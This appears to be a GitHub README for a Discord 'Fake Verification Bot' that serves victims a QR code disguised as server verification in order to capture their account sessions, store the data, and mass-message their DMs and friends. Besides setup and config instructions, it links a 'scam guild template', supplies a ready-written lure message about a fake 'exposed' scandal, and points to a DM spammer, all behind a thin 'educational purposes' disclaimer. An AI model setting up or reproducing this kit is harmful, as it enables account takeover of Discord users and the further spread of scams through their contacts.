<h1 align="center">[Discord] - Fake Verification Bot</h1>


<p align="center">
  <a href="https://github.com/Pxsx/Fake-Verification-Bot">
    <img src="https://img.shields.io/badge/License-MIT-important">
  </a>
  <a href="https://www.python.org">
    <img src="https://img.shields.io/badge/Python-3.9-informational.svg">
  </a>
</p>

<p align="center">
  [Discord] - This Bot is a Script Gathering for Windows systems written in Python.
</p>
<h3><p align="center">
  My work was never created to be used in a malicious way. I noticed that it was used to scam other people and I'm sorry about that.
  I'm thinking of not deleting this directory to not avoid further damage.
</p></h3>


## Disclaimer

|Bot was made for Educational purposes|
|-------------------------------------------------|
This project was created only for good purposes and personal use.
By using this Bot, you agree that you hold responsibility and accountability of any consequences caused by your actions.

## Features

- Async QR Code Management
- Using Websockets (no browser used)
- Personal QR Code (visible only to the person passing the verification)
- Saves the information in a json file
- Can gives a role to the user after his verification
- Can send a message to all the user's DMs + all user's Friend
- Possibility to define a logs channel

## How To Setup/Install

#### First of all please set your informations in the config.json file!
```json
{
    "botToken": "BOT-TOKEN-HERE", #For more information, read below
    "logs_channel_id": "LOGS-CHANNEL-ID-HERE", #ID of the channel to which the bot logs will be sent
    
    "prefix": "PREFIX-HERE",
    "command_name": "COMMAND-NAME-HERE",
    
    "give_role": false, #Can take the value: true or false
    "role_name": "ROLE-NAME-HERE", #Name of the role you want to give to the user after scanning the QR Code
    
    "mass_dm": 0, #Can take the value: 0 (Disable), 1 (current user's dms), 2 (user's friends), 3 (Current DMs + Friends)
    "message": "MESSAGE-HERE" #Message you want to send to all user's DMs after scanning the QR code
}
```
#### Set up and invite your Bot.
- Create a bot on the [Discord Developer page](https://discord.com/developers/applications)
- Enable all instances in the "Bot" tab
- Invite your bot using this [invite](https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=8&scope=applications.commands%20bot) (replace CLIENTID by the ID of your Bot)

#### 1st・Installation (Automated installation)
```
Launch the setup.bat file. A new file will be created. You will only have to launch it.
```

#### 2nd・Installation (Manual installation)
```
$ git clone https://github.com/pxsx/Fake-Verification-Bot.git
$ python -m pip install -r requirements.txt
$ python main.py
```

## Additional Informations
Nice to Have:
- Discord Scam Guild Template: https://discord.new/5QaMySZDeMAB
- Mass DM Message Template: `Hey umm idk what happend or if it's really you but it was your name and the same avatar and you sent a girl erm***** stuff like what the fuck? <INSERT DISCORD INVITE HERE> check #exposed and you'll see. Anyways until you explain what happend im blocking you. sorry if this is an understanding but i do not wanna take risks with having creeps on my friendlist.`
-  A Good DM Spammer
A Good DM Spammer that is open Source: https://github.com/V4NSH4J/discord-mass-DM-GO
